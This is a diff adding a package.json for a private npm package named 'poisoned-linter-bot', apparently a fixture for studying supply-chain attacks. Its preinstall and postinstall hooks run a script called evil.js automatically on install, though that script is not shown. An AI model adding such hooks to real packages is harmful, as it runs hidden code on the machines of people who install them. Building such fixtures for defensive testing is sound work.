@@ -1,0 +1,9 @@
+{
+  "name": "poisoned-linter-bot",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "preinstall": "node evil.js preinstall",
+    "postinstall": "node evil.js postinstall"
+  }
+}
